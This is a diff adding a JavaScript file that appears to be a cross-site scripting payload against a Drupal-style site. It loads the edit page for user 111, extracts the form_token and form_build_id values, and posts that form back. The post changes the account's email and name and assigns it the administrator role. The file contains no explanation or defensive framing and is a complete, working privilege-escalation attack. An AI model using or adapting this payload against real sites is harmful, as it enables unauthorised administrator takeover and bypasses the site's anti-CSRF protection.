@@ -1,0 +1,42 @@
+var parser = new DOMParser();
+
+
+var xhr = new XMLHttpRequest();
+xhr.open("GET", "/users/111/edit?destination=/admin/people");
+
+var request = new XMLHttpRequest();
+
+xhr.onreadystatechange = function () {
+   if (xhr.readyState === 4) {
+      
+      
+      
+      var page = parser.parseFromString(xhr.responseText, "text/html");
+      console.log(page);
+      var form_token = page.getElementsByName("form_token")[0].value
+	  console.log(form_token);
+      var form_build_id =  page.getElementsByName("form_build_id")[0].value
+      console.log(form_build_id);
+	  
+	  let formData = new FormData(); 
+
+
+	  formData.append('mail', 'truc@truc.com'); 
+      formData.append('name', 'TRUC'); 
+	  formData.append('status', '1'); 
+	  formData.append('roles[administrator]', 'administrator');
+	  formData.append('user_picture[0][display]', '1');
+	  formData.append('preferred_langcode', 'fr');
+	  formData.append('form_build_id', form_build_id );
+	  formData.append('form_token', form_token);
+	  formData.append('form_id', 'user_form');
+	  formData.append('op', 'Enregistrer');
+
+	 request.open("POST", "/users/111/edit?destination=/admin/people");
+         request.send(formData);
+	  console.log(form_token);
+    	  console.log(form_build_id);
+   }};
+
+
+xhr.send();
